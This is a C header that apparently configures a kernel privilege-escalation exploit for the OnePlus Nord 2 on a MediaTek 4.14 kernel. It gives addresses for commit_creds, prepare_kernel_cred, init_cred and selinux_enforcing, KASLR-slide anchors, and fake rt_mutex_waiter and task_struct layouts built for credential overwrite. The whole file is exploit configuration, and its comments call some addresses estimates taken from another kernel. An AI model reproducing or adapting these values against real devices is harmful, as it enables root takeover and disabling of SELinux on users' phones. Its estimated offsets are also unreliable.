/* target.h - OnePlus Nord 2 (DN2101/DN2103) MediaTek MT6893 4.14.186
 * 
 * This is a best-effort target configuration based on:
 * - kallsyms TEXT symbols
 * - aristotle (MediaTek 5.10) as reference
 * - task_struct offsets from disassembly
 */
#ifndef TARGET_H
#define TARGET_H

/* ============================================================
 * KASLR Configuration
 * ============================================================
 */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL  /* Standard ARM64 base */
#define ACTUAL_KERNEL_BASE 0xffffff9805280800ULL

/* MediaTek 4.14 memory map */
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x40000000ULL
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL

/* pselect waiter word shift */
#define PSELECT_WAITER_WORD_SHIFT 0

/* ============================================================
 * Kernel Symbol IMAGE Addresses (offsets from kallsyms)
 * ============================================================
 */
#define COMMIT_CREDS_OFF           0x00060f04ULL
#define PREPARE_KERNEL_CRED_OFF    0x0006129cULL
#define NOOP_LLSEEK_OFF            0x001fd140ULL
#define CAP_CAPABLE_OFF            0x003cb62cULL
#define ASHMEM_LLSEEK_OFF          0x00d854e8ULL
#define ASHMEM_IOCTL_OFF           0x00d8563cULL
#define NFULNL_LOG_PACKET_OFF      0x00ef0ab4ULL

#define COMMIT_CREDS_IMAGE (KIMAGE_TEXT_BASE + COMMIT_CREDS_OFF)
#define PREPARE_KERNEL_CRED_IMAGE (KIMAGE_TEXT_BASE + PREPARE_KERNEL_CRED_OFF)
#define NOOP_LLSEEK_IMAGE (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define CAP_CAPABLE_IMAGE (KIMAGE_TEXT_BASE + CAP_CAPABLE_OFF)
#define ASHMEM_LLSEEK_IMAGE (KIMAGE_TEXT_BASE + ASHMEM_LLSEEK_OFF)
#define ASHMEM_IOCTL_IMAGE (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + NFULNL_LOG_PACKET_OFF)

/* ============================================================
 * KASLR Bypass - Using aristotle-style IMAGE addresses
 * ============================================================
 * These are estimates - aristotle kernel base is 0xffffffc010000000
 * Our kernel base is 0xffffff9805280800
 * The offset difference is handled by canon_addr() with KASLR slide
 */
#define INIT_TASK (KIMAGE_TEXT_BASE + 0x0277bf80ULL)
#define INIT_CRED (KIMAGE_TEXT_BASE + 0x02790930ULL)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + 0x02a25b90ULL)
#define PER_CPU_OFFSET (KIMAGE_TEXT_BASE + 0x0276a548ULL)
#define ENTRY_TASK (KIMAGE_TEXT_BASE + 0x027362f8ULL)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + 0x02976040ULL)

/* KASLR anchors for slide technique */
#define SLIDE_NFULNL_LOGGER_IMAGE NFULNL_LOGGER_IMAGE
#define SLIDE_INIT_TASK_IMAGE INIT_TASK
#define SLIDE_ROOT_TASK_GROUP_IMAGE ROOT_TASK_GROUP
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + 0x02771380ULL)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + 0x02886cf8ULL)

/* ============================================================
 * rt_mutex_waiter layout for 4.14 (flat 10-word layout)
 * ============================================================
 */
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48

/* Fake waiter layout */
#define FAKE_WAITER_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38

/* ============================================================
 * task_struct offsets - From disassembly of commit_creds
 * ============================================================
 * ldr x9, [x8, #2008] -> real_cred at offset 0x7d8
 * ldr x8, [x8, #2000] -> cred at offset 0x7d0
 */
#define TASK_REAL_CRED_OFF 0x7d8
#define TASK_CRED_OFF 0x7d0
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_PI_LOCK_OFF 0x86c
#define FAKE_TASK_PI_WAITERS_OFF 0x880
#define FAKE_TASK_PI_TOP_TASK_OFF 0x890
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898
#define FAKE_TASK_TASK_GROUP_OFF 0x310
#define FAKE_TASK_UCLAMP_REQ_OFF 0x408
#define FAKE_TASK_UCLAMP_OFF 0x410

/* ============================================================
 * MM_STRUCT configuration
 * ============================================================
 */
#define MM_STRUCT_SZ 0x380  /* 896 bytes from /proc/slabinfo */

#endif /* TARGET_H */
